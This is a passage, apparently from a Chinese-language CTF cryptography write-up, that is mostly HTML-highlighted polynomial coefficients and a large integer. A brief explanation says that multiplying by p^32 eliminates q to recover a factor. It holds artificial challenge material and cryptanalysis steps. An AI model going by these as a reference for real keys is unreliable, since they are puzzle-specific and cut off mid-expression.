class="number">20</span>*y^<span class="number">8</span> - <span class="number">3</span>*x^<span class="number">19</span>*y^<span class="number">9</span> + <span class="number">4</span>*x^<span class="number">17</span>*y^<span class="number">11</span> - x^<span class="number">16</span>*y^<span class="number">12</span> - <span class="number">3</span>*x^<span class="number">15</span>*y^<span class="number">13</span> - <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">14</span> + x^<span class="number">13</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">17</span> + x^<span class="number">10</span>*y^<span class="number">18</span> - <span class="number">2</span>*x^<span class="number">9</span>*y^<span class="number">19</span> + x^<span class="number">8</span>*y^<span class="number">20</span> - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">21</span> - x^<span class="number">6</span>*y^<span class="number">22</span> + x^<span class="number">5</span>*y^<span class="number">23</span> - x^<span class="number">4</span>*y^<span class="number">24</span> + x^<span class="number">3</span>*y^<span class="number">25</span> + x^<span class="number">2</span>*y^<span class="number">26</span> - x*y^<span class="number">27</span> - y^<span class="number">28</span> + x^<span class="number">27</span> + x^<span class="number">26</span>*y - <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">3</span> + x^<span class="number">23</span>*y^<span class="number">4</span> - <span class="number">3</span>*x^<span class="number">22</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">21</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">20</span>*y^<span class="number">7</span> - <span class="number">5</span>*x^<span class="number">19</span>*y^<span class="number">8</span> + <span class="number">2</span>*x^<span class="number">18</span>*y^<span class="number">9</span> - <span class="number">5</span>*x^<span class="number">17</span>*y^<span class="number">10</span> + x^<span class="number">16</span>*y^<span class="number">11</span> - <span class="number">3</span>*x^<span class="number">15</span>*y^<span class="number">12</span> - <span class="number">4</span>*x^<span class="number">14</span>*y^<span class="number">13</span> - x^<span class="number">13</span>*y^<span class="number">14</span> + x^<span class="number">12</span>*y^<span class="number">15</span> + <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">16</span> + <span class="number">2</span>*x^<span class="number">10</span>*y^<span class="number">17</span> - <span class="number">4</span>*x^<span class="number">9</span>*y^<span class="number">18</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">21</span> + x^<span class="number">5</span>*y^<span class="number">22</span> + <span class="number">4</span>*x^<span class="number">3</span>*y^<span class="number">24</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">25</span> + <span class="number">2</span>*x*y^<span class="number">26</span> - <span class="number">2</span>*y^<span class="number">27</span> + x^<span class="number">25</span>*y + x^<span class="number">24</span>*y^<span class="number">2</span> + x^<span class="number">23</span>*y^<span class="number">3</span> + <span class="number">5</span>*x^<span class="number">22</span>*y^<span class="number">4</span> + x^<span class="number">20</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">19</span>*y^<span class="number">7</span> + x^<span class="number">18</span>*y^<span class="number">8</span> - x^<span class="number">17</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">15</span>*y^<span class="number">11</span> - x^<span class="number">14</span>*y^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">13</span>*y^<span class="number">13</span> - x^<span class="number">12</span>*y^<span class="number">14</span> + <span class="number">4</span>*x^<span class="number">11</span>*y^<span class="number">15</span> - x^<span class="number">10</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">20</span> - x^<span class="number">5</span>*y^<span class="number">21</span> + <span class="number">3</span>*x^<span class="number">3</span>*y^<span class="number">23</span> + x^<span class="number">2</span>*y^<span class="number">24</span> - <span class="number">3</span>*x*y^<span class="number">25</span> - <span class="number">3</span>*y^<span class="number">26</span> + <span class="number">3</span>*x^<span class="number">25</span> - <span class="number">2</span>*x^<span class="number">23</span>*y^<span class="number">2</span> - x^<span class="number">21</span>*y^<span class="number">4</span> + x^<span class="number">17</span>*y^<span class="number">8</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">9</span> - x^<span class="number">15</span>*y^<span class="number">10</span> - <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">11</span> - x^<span class="number">13</span>*y^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">13</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">14</span> - x^<span class="number">9</span>*y^<span class="number">16</span> - x^<span class="number">8</span>*y^<span class="number">17</span> - x^<span class="number">6</span>*y^<span class="number">19</span> - x^<span class="number">5</span>*y^<span class="number">20</span> + x^<span class="number">4</span>*y^<span class="number">21</span> + x^<span class="number">3</span>*y^<span class="number">22</span> + <span class="number">5</span>*x*y^<span class="number">24</span> - <span class="number">2</span>*y^<span class="number">25</span> - x^<span class="number">24</span> + <span class="number">2</span>*x^<span class="number">23</span>*y + x^<span class="number">22</span>*y^<span class="number">2</span> - x^<span class="number">21</span>*y^<span class="number">3</span> - x^<span class="number">19</span>*y^<span class="number">5</span> + x^<span class="number">18</span>*y^<span class="number">6</span> - x^<span class="number">17</span>*y^<span class="number">7</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">8</span> - <span class="number">4</span>*x^<span class="number">15</span>*y^<span class="number">9</span> - x^<span class="number">14</span>*y^<span class="number">10</span> - x^<span class="number">13</span>*y^<span class="number">11</span> - x^<span class="number">12</span>*y^<span class="number">12</span> + <span class="number">4</span>*x^<span class="number">10</span>*y^<span class="number">14</span> + <span class="number">2</span>*x^<span class="number">9</span>*y^<span class="number">15</span> - x^<span class="number">8</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">17</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">18</span> + <span class="number">4</span>*x^<span class="number">5</span>*y^<span class="number">19</span> + x^<span class="number">4</span>*y^<span class="number">20</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">22</span> - <span class="number">5</span>*x*y^<span class="number">23</span> - y^<span class="number">24</span> + x^<span class="number">23</span> - x^<span class="number">22</span>*y + <span class="number">2</span>*x^<span class="number">21</span>*y^<span class="number">2</span> - x^<span class="number">20</span>*y^<span class="number">3</span> - x^<span class="number">18</span>*y^<span class="number">5</span> - x^<span class="number">17</span>*y^<span class="number">6</span> - <span class="number">5</span>*x^<span class="number">15</span>*y^<span class="number">8</span> + x^<span class="number">14</span>*y^<span class="number">9</span> - <span class="number">3</span>*x^<span class="number">13</span>*y^<span class="number">10</span> + <span class="number">3</span>*x^<span class="number">12</span>*y^<span class="number">11</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">12</span> - <span class="number">2</span>*x^<span class="number">10</span>*y^<span class="number">13</span> - <span class="number">2</span>*x^<span class="number">9</span>*y^<span class="number">14</span> - x^<span class="number">8</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">17</span> - <span class="number">4</span>*x^<span class="number">5</span>*y^<span class="number">18</span> - <span class="number">5</span>*x^<span class="number">3</span>*y^<span class="number">20</span> - x^<span class="number">2</span>*y^<span class="number">21</span> - x*y^<span class="number">22</span> - <span class="number">4</span>*y^<span class="number">23</span> - x^<span class="number">22</span> + <span class="number">2</span>*x^<span class="number">21</span>*y - <span class="number">2</span>*x^<span class="number">20</span>*y^<span class="number">2</span> - <span class="number">2</span>*x^<span class="number">19</span>*y^<span class="number">3</span> - <span class="number">3</span>*x^<span class="number">17</span>*y^<span class="number">5</span> - x^<span class="number">16</span>*y^<span class="number">6</span> - x^<span class="number">15</span>*y^<span class="number">7</span> + <span class="number">4</span>*x^<span class="number">13</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">10</span> + <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">11</span> + <span class="number">2</span>*x^<span class="number">10</span>*y^<span class="number">12</span> - x^<span class="number">9</span>*y^<span class="number">13</span> - x^<span class="number">7</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">16</span> + x^<span class="number">3</span>*y^<span class="number">19</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">20</span> + <span class="number">2</span>*x*y^<span class="number">21</span> + <span class="number">3</span>*y^<span class="number">22</span> - <span class="number">3</span>*x^<span class="number">21</span> - x^<span class="number">20</span>*y - x^<span class="number">19</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">17</span>*y^<span class="number">4</span> - x^<span class="number">16</span>*y^<span class="number">5</span> - x^<span class="number">15</span>*y^<span class="number">6</span> + x^<span class="number">14</span>*y^<span class="number">7</span> - <span class="number">5</span>*x^<span class="number">12</span>*y^<span class="number">9</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">10</span> + x^<span class="number">10</span>*y^<span class="number">11</span> + x^<span class="number">6</span>*y^<span class="number">15</span> + x^<span class="number">5</span>*y^<span class="number">16</span> + x^<span class="number">4</span>*y^<span class="number">17</span> - <span class="number">3</span>*x^<span class="number">2</span>*y^<span class="number">19</span> - <span class="number">2</span>*x*y^<span class="number">20</span> - <span class="number">2</span>*y^<span class="number">21</span> + x^<span class="number">20</span> + <span class="number">2</span>*x^<span class="number">19</span>*y - <span class="number">2</span>*x^<span class="number">17</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">4</span> - <span class="number">3</span>*x^<span class="number">15</span>*y^<span class="number">5</span> + <span class="number">4</span>*x^<span class="number">14</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">13</span>*y^<span class="number">7</span> - x^<span class="number">12</span>*y^<span class="number">8</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">9</span> + x^<span class="number">10</span>*y^<span class="number">10</span> + <span class="number">6</span>*x^<span class="number">9</span>*y^<span class="number">11</span> + x^<span class="number">8</span>*y^<span class="number">12</span> + x^<span class="number">7</span>*y^<span class="number">13</span> + <span class="number">2</span>*x^<span class="number">5</span>*y^<span class="number">15</span> + <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">16</span> + x^<span class="number">3</span>*y^<span class="number">17</span> - x^<span class="number">2</span>*y^<span class="number">18</span> + <span class="number">3</span>*x*y^<span class="number">19</span> - x^<span class="number">17</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">3</span> + <span class="number">3</span>*x^<span class="number">14</span>*y^<span class="number">5</span> - x^<span class="number">13</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">8</span> + x^<span class="number">10</span>*y^<span class="number">9</span> + <span class="number">3</span>*x^<span class="number">9</span>*y^<span class="number">10</span> - x^<span class="number">7</span>*y^<span class="number">12</span> - x^<span class="number">6</span>*y^<span class="number">13</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">14</span> - <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">15</span> + x^<span class="number">2</span>*y^<span class="number">17</span> + <span class="number">2</span>*y^<span class="number">19</span> - x^<span class="number">18</span> - x^<span class="number">16</span>*y^<span class="number">2</span> - <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">4</span> - <span class="number">2</span>*x^<span class="number">13</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">9</span>*y^<span class="number">9</span> + <span class="number">3</span>*x^<span class="number">8</span>*y^<span class="number">10</span> + x^<span class="number">6</span>*y^<span class="number">12</span> - x^<span class="number">4</span>*y^<span class="number">14</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">16</span> - <span class="number">2</span>*x*y^<span class="number">17</span> - x^<span class="number">17</span> - <span class="number">4</span>*x^<span class="number">16</span>*y - <span class="number">2</span>*x^<span class="number">15</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">3</span> - x^<span class="number">13</span>*y^<span class="number">4</span> + x^<span class="number">12</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">10</span>*y^<span class="number">7</span> - x^<span class="number">9</span>*y^<span class="number">8</span> - <span class="number">5</span>*x^<span class="number">8</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">11</span> - x^<span class="number">5</span>*y^<span class="number">12</span> + x^<span class="number">4</span>*y^<span class="number">13</span> - <span class="number">3</span>*x^<span class="number">2</span>*y^<span class="number">15</span> + x*y^<span class="number">16</span> - <span class="number">3</span>*x^<span class="number">16</span> + x^<span class="number">15</span>*y - <span class="number">3</span>*x^<span class="number">14</span>*y^<span class="number">2</span> - x^<span class="number">13</span>*y^<span class="number">3</span> - x^<span class="number">12</span>*y^<span class="number">4</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">5</span> - x^<span class="number">10</span>*y^<span class="number">6</span> + <span class="number">5</span>*x^<span class="number">8</span>*y^<span class="number">8</span> + <span class="number">3</span>*x^<span class="number">7</span>*y^<span class="number">9</span> + <span class="number">3</span>*x^<span class="number">6</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">5</span>*y^<span class="number">11</span> + <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">13</span> + x^<span class="number">2</span>*y^<span class="number">14</span> - <span class="number">3</span>*x*y^<span class="number">15</span> - x^<span class="number">15</span> + <span class="number">3</span>*x^<span class="number">14</span>*y + x^<span class="number">13</span>*y^<span class="number">2</span> - x^<span class="number">12</span>*y^<span class="number">3</span> - <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">4</span> + x^<span class="number">10</span>*y^<span class="number">5</span> - x^<span class="number">9</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">8</span>*y^<span class="number">7</span> - x^<span class="number">7</span>*y^<span class="number">8</span> + <span class="number">4</span>*x^<span class="number">5</span>*y^<span class="number">10</span> - <span class="number">2</span>*x^<span class="number">4</span>*y^<span class="number">11</span> + x^<span class="number">3</span>*y^<span class="number">12</span> - x^<span class="number">14</span> + x^<span class="number">13</span>*y + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">2</span> + x^<span class="number">11</span>*y^<span class="number">3</span> - <span class="number">5</span>*x^<span class="number">10</span>*y^<span class="number">4</span> - x^<span class="number">9</span>*y^<span class="number">5</span> - <span class="number">3</span>*x^<span class="number">8</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">7</span> + x^<span class="number">6</span>*y^<span class="number">8</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">9</span> + x^<span class="number">4</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">11</span> - x^<span class="number">2</span>*y^<span class="number">12</span> - <span class="number">4</span>*x*y^<span class="number">13</span> + <span class="number">3</span>*y^<span class="number">14</span> + x^<span class="number">12</span>*y - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">2</span> - x^<span class="number">9</span>*y^<span class="number">4</span> - x^<span class="number">8</span>*y^<span class="number">5</span> + <span class="number">5</span>*x^<span class="number">7</span>*y^<span class="number">6</span> - <span class="number">4</span>*x^<span class="number">6</span>*y^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">8</span> + <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">9</span> - <span class="number">3</span>*x^<span class="number">3</span>*y^<span class="number">10</span> - x^<span class="number">2</span>*y^<span class="number">11</span> - <span class="number">2</span>*x*y^<span class="number">12</span> - <span class="number">3</span>*y^<span class="number">13</span> + <span class="number">3</span>*x^<span class="number">12</span> + x^<span class="number">11</span>*y + x^<span class="number">10</span>*y^<span class="number">2</span> + x^<span class="number">9</span>*y^<span class="number">3</span> + x^<span class="number">8</span>*y^<span class="number">4</span> - x^<span class="number">6</span>*y^<span class="number">6</span> - x^<span class="number">5</span>*y^<span class="number">7</span> - <span class="number">4</span>*x^<span class="number">3</span>*y^<span class="number">9</span> - x^<span class="number">2</span>*y^<span class="number">10</span> - <span class="number">3</span>*x*y^<span class="number">11</span> - <span class="number">2</span>*y^<span class="number">12</span> + x^<span class="number">10</span>*y + <span class="number">5</span>*x^<span class="number">9</span>*y^<span class="number">2</span> + x^<span class="number">8</span>*y^<span class="number">3</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">6</span> + x^<span class="number">4</span>*y^<span class="number">7</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">8</span> - <span class="number">4</span>*x^<span class="number">2</span>*y^<span class="number">9</span> + <span class="number">2</span>*x*y^<span class="number">10</span> + <span class="number">3</span>*y^<span class="number">11</span> - x^<span class="number">10</span> - <span class="number">2</span>*x^<span class="number">9</span>*y - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">3</span> - x^<span class="number">6</span>*y^<span class="number">4</span> + x^<span class="number">5</span>*y^<span class="number">5</span> + <span class="number">3</span>*x^<span class="number">4</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">8</span> - x*y^<span class="number">9</span> + <span class="number">4</span>*x^<span class="number">9</span> - <span class="number">3</span>*x^<span class="number">8</span>*y - <span class="number">3</span>*x^<span class="number">6</span>*y^<span class="number">3</span> + x^<span class="number">5</span>*y^<span class="number">4</span> - x^<span class="number">4</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">7</span> + x*y^<span class="number">8</span> + <span class="number">4</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">8</span> - x^<span class="number">7</span>*y - <span class="number">2</span>*x^<span class="number">5</span>*y^<span class="number">3</span> - <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">4</span> + <span class="number">3</span>*x^<span class="number">3</span>*y^<span class="number">5</span> + <span class="number">4</span>*x^<span class="number">2</span>*y^<span class="number">6</span> + <span class="number">2</span>*x*y^<span class="number">7</span> - <span class="number">2</span>*y^<span class="number">8</span> + <span class="number">2</span>*x^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">2</span> + <span class="number">3</span>*x^<span class="number">2</span>*y^<span class="number">5</span> - x*y^<span class="number">6</span> - <span class="number">4</span>*x^<span class="number">6</span> + <span class="number">6</span>*x^<span class="number">3</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">4</span> - <span class="number">2</span>*x*y^<span class="number">5</span> - <span class="number">3</span>*y^<span class="number">6</span> + x^<span class="number">5</span> - <span class="number">3</span>*x^<span class="number">4</span>*y + x^<span class="number">3</span>*y^<span class="number">2</span> + x^<span class="number">2</span>*y^<span class="number">3</span> - <span class="number">2</span>*x*y^<span class="number">4</span> + <span class="number">2</span>*x^<span class="number">4</span> - <span class="number">2</span>*x^<span class="number">3</span>*y + <span class="number">6</span>*x^<span class="number">2</span>*y^<span class="number">2</span> - <span class="number">3</span>*x*y^<span class="number">3</span> - <span class="number">2</span>*y^<span class="number">4</span> - <span class="number">5</span>*x^<span class="number">3</span> - <span class="number">2</span>*x^<span class="number">2</span>*y - <span class="number">2</span>*x*y^<span class="number">2</span> + <span class="number">3</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">2</span> - x*y + y^<span class="number">2</span> - <span class="number">2</span>*x + <span class="number">2</span>*y - <span class="number">2</span></span><br><span class="line">w = <span class="number">12796020294902567574981427270787776254781813995526831579805652479456168245098217943847166109912113827479436654134179666391771173421469188197935460525521295192736123648410762964187396897298542198935971755852754544978564521188423737649175136194386664628304164316905741781089536713701674793641345344818309314224</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这次的多项式中既有p也有q，所以我们要想办法消去一个。只要给原版的多项式乘上p$^{32}$，就可以消掉全部的q.</p>
<p>消去后的多项式如下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n**<span class="number">31</span>*p + <span class="number">2</span>*n**<span class="number">30</span>*p**<span class="number">3</span> - n**<span class="number">30</span>*p**<span class="number">2</span> - n**<span class="number">29</span>*p**<span class="number">3</span> + n**<span class="number">28</span>*p**<span class="number">7</span> - <span class="number">2</span>*n**<span class="number">28</span>*p**<span class="number">6</span> + <span class="number">2</span>*n**<span class="number">28</span>*p**<span class="number">5</span> - n**<span class="number">28</span>*p**<span class="number">4</span> + <span class="number">6</span>*n**<span class="number">27</span>*p**<span class="number">9</span> - <span class="number">2</span>*n**<span class="number">27</span>*p**<span class="number">8</span> - n**<span class="number">27</span>*p**<span class="number">7</span> - n**<span class="number">27</span>*p**<span class="number">6</span> - <span class="number">2</span>*n**<span class="number">27</span>*p**<span class="number">5</span> - n**<span class="number">26</span>*p**<span class="number">10</span> - <span class="number">5</span>*n**<span class="number">26</span>*p**<span class="number">9</span> + n**<span class="number">26</span>*p**<span class="number">8</span> + <span class="number">2</span>*n**<span class="number">26</span>*p**<span class="number">7</span> - <span class="number">3</span>*n**<span class="number">26</span>*p**<span class="number">6</span> + n**<span class="number">25</span>*p**<span class="number">13</span> + n**<span class="number">25</span>*p**<span class="number">12</span> + n**<span class="number">25</span>*p**<span class="number">10</span> + <span class="number">2</span>*n**<span class="number">25</span>*p**<span class="number">9</span> - <span class="number">3</span>*n**<span class="number">25</span>*p**<span class="number">8</span> - <span class="number">2</span>*n**<span class="number">25</span>*p**<span class="number">7</span> + <span class="number">5</span>*n**<span class="number">24</span>*p**<span class="number">15</span> + <span class="number">3</span>*n**<span class="number">24</span>*p**<span class="number">13</span> - n**<span class="number">24</span>*p**<span class="number">12</span> + <span class="number">4</span>*n**<span class="number">24</span>*p**<span class="number">11</span> + n**<span class="number">24</span>*p**<span class="number">10</span> + <span class="number">5</span>*n**<span class="number">24</span>*p**<span class="number">9</span> - n**<span class="number">24</span>*p**<span class="number">8</span> + n**<span class="number">23</span>*p**<span class="number">16</span> - <span class="number">2</span>*n**<span class="number">23</span>*p**<span class="number">15</span> + n**<span class="number">23</span>*p**<span class="number">14</span> + <span class="number">3</span>*n**<span class="number">23</span>*p**<span class="number">12</span> - <span class="number">5</span>*n**<span class="number">23</span>*p**<span class="number">10</span> - <span class="number">4</span>*n**<span class="number">23</span>*p**<span class="number">9</span> - <span class="number">3</span>*n**<span class="number">22</span>*p**<span class="number">19</span> + <span class="number">2</span>*n**<span class="number">22</span>*p**<span class="number">18</span> - <span class="number">5</span>*n**<span class="number">22</span>*p**<span class="number">17</span> - n**<span class="number">22</span>*p**<span class="number">16</span> + n**<span class="number">22</span>*p**<span class="number">15</span> + n**<span class="number">22</span>*p**<span class="number">13</span> + <span class="number">2</span>*n**<span class="number">22</span>*p**<span class="number">12</span> - n**<span class="number">22</span>*p**<span class="number">11</span> + <span class="number">3</span>*n**<span class="number">22</span>*p**<span class="number">10</span> + n**<span class="number">21</span>*p**<span class="number">20</span> - <span class="number">2</span>*n**<span class="number">21</span>*p**<span class="number">19</span> - <span class="number">2</span>*n**<span class="number">21</span>*p**<span class="number">18</span> - <span class="number">2</span>*n**<span class="number">21</span>*p**<span class="number">17</span> - n**<span class="number">21</span>*p**<span class="number">16</span> + n**<span class="number">21</span>*p**<span class="number">15</span> - n**<span class="number">21</span>*p**<span class="number">13</span> + <span class="number">2</span>*n**<span class="number">21</span>*p**<span class="number">12</span> - <span class="number">2</span>*n**<span class="number">21</span>*p**<span class="number">11</span> - <span class="number">2</span>*n**<span class="number">20</span>*p**<span class="number">23</span> - n**<span class="number">20</span>*p**<span class="number">22</span> - n**<span class="number">20</span>*p**<span class="number">21</span> + n**<span class="number">20</span>*p**<span class="number">20</span> - <span class="number">2</span>*n**<span class="number">20</span>*p**<span class="number">18</span> - n**<span class="number">20</span>*p**<span class="number">17</span> + n**<span class="number">20</span>*p**<span class="number">16</span> - <span class="number">5</span>*n**<span class="number">20</span>*p**<span class="number">15</span> + <span class="number">2</span>*n**<span class="number">20</span>*p**<span class="number">14</span> - <span class="number">2</span>*n**<span class="number">20</span>*p**<span class="number">13</span> + n**<span class="number">19</span>*p**<span class="number">25</span> - <span class="number">3</span>*n**<span class="number">19</span>*p**<span class="number">24</span> - <span class="number">2</span>*n**<span class="number">19</span>*p**<span class="number">22</span> - n**<span class="number">19</span>*p**<span class="number">19</span> + <span class="number">4</span>*n**<span class="number">19</span>*p**<span class="number">18</span> + n**<span class="number">19</span>*p**<span class="number">16</span> - <span class="number">3</span>*n**<span class="number">19</span>*p**<span class="number">15</span> + <span class="number">3</span>*n**<span class="number">19</span>*p**<span class="number">14</span> + <span class="number">2</span>*n**<span class="number">19</span>*p**<span class="number">13</span> + n**<span class="number">18</span>*p**<span class="number">27</span> - <span class="number">2</span>*n**<span class="number">18</span>*p**<span class="number">26</span> + <span class="number">5</span>*n**<span class="number">18</span>*p**<span class="number">25</span> + n**<span class="number">18</span>*p**<span class="number">24</span> - <span class="number">4</span>*n**<span class="number">18</span>*p**<span class="number">23</span> - <span class="number">2</span>*n**<span class="number">18</span>*p**<span class="number">20</span> - <span class="number">4</span>*n**<span class="number">18</span>*p**<span class="number">19</span> - n**<span class="number">18</span>*p**<span class="number">16</span> + n**<span class="number">17</span>*p**<span class="number">29</span> + n**<span class="number">17</span>*p**<span class="number">27</span> - <span class="number">2</span>*n**<span class="number">17</span>*p**<span class="number">26</span> + <span class="number">2</span>*n**<span class="number">17</span>*p**<span class="number">25</span> - n**<span class="number">17</span>*p**<span class="number">23</span> - <span class="number">2</span>*n**<span class="number">17</span>*p**<span class="number">22</span> - <span class="number">2</span>*n**<span class="number">17</span>*p**<span class="number">21</span> + n**<span class="number">17</span>*p**<span class="number">19</span> + n**<span class="number">17</span>*p**<span class="number">18</span> + n**<span class="number">17</span>*p**<span class="number">17</span> - <span class="number">2</span>*n**<span class="number">17</span>*p**<span class="number">16</span> - n**<span class="number">16</span>*p**<span class="number">31</span> - n**<span class="number">16</span>*p**<span class="number">30</span> + n**<span class="number">16</span>*p**<span class="number">29</span> + <span class="number">2</span>*n**<span class="number">16</span>*p**<span class="number">28</span> + <span class="number">3</span>*n**<span class="number">16</span>*p**<span class="number">27</span> - n**<span class="number">16</span>*p**<span class="number">26</span> - n**<span class="number">16</span>*p**<span class="number">25</span> - n**<span class="number">16</span>*p**<span class="number">24</span> + <span class="number">2</span>*n**<span class="number">16</span>*p**<span class="number">23</span> + <span class="number">2</span>*n**<span class="number">16</span>*p**<span class="number">22</span> + n**<span class="number">16</span>*p**<span class="number">21</span> + <span class="number">4</span>*n**<span class="number">16</span>*p**<span class="number">20</span> + <span class="number">2</span>*n**<span class="number">16</span>*p**<span class="number">18</span> + n**<span class="number">16</span>*p**<span class="number">17</span> - <span class="number">4</span>*n**<span class="number">15</span>*p**<span class="number">33</span> + n**<span class="number">15</span>*p**<span class="number">32</span> + n**<span class="number">15</span>*p**<span class="number">31</span> + n**<span class="number">15</span>*p**<span class="number">30</span> + n**<span class="number">15</span>*p**<span class="number">29</span> + <span class="number">4</span>*n**<span class="number">15</span>*p**<span class="number">28</span> + <span class="number">2</span>*n**<span class="number">15</span>*p**<span class="number">26</span> - n**<span class="number">15</span>*p**<span class="number">25</span> - n**<span class="number">15</span>*p**<span class="number">24</span> + n**<span class="number">15</span>*p**<span class="number">23</span> + <span class="number">2</span>*n**<span class="number">15</span>*p**<span class="number">22</span> - <span class="number">4</span>*n**<span class="number">15</span>*p**<span class="number">21</span> + <span class="number">2</span>*n**<span class="number">15</span>*p**<span class="number">20</span> - <span class="number">3</span>*n**<span class="number">15</span>*p**<span class="number">19</span> - <span class="number">3</span>*n**<span class="number">15</span>*p**<span class="number">18</span> - <span class="number">5</span>*n**<span class="number">14</span>*p**<span class="number">35</span> + n**<span class="number">14</span>*p**<span class="number">33</span> - <span class="number">2</span>*n**<span class="number">14</span>*p**<span class="number">32</span> - n**<span class="number">14</span>*p**<span class="number">31</span> - n**<span class="number">14</span>*p**<span class="number">30</span> - <span class="number">2</span>*n**<span class="number">14</span>*p**<span class="number">29</span> + <span class="number">4</span>*n**<span class="number">14</span>*p**<span class="number">28</span> - <span class="number">2</span>*n**<span class="number">14</span>*p**<span class="number">27</span> + <span class="number">3</span>*n**<span class="number">14</span>*p**<span class="number">23</span> - n**<span class="number">14</span>*p**<span class="number">22</span> + n**<span class="number">14</span>*p**<span class="number">20</span> + <span class="number">3</span>*n**<span class="number">14</span>*p**<span class="number">18</span> + n**<span class="number">13</span>*p**<span class="number">37</span> + n**<span class="number">13</span>*p**<span class="number">35</span> - <span class="number">3</span>*n**<span class="number">13</span>*p**<span class="number">34</span> - <span class="number">4</span>*n**<span class="number">13</span>*p**<span class="number">33</span> + <span class="number">2</span>*n**<span class="number">13</span>*p**<span class="number">32</span> + <span class="number">2</span>*n**<span class="number">13</span>*p**<span class="number">31</span> - <span class="number">2</span>*n**<span class="number">13</span>*p**<span class="number">29</span> - n**<span class="number">13</span>*p**<span class="number">28</span> + n**<span class="number">13</span>*p**<span class="number">26</span> - n**<span class="number">13</span>*p**<span class="number">25</span> + n**<span class="number">13</span>*p**<span class="number">23</span> + <span class="number">2</span>*n**<span 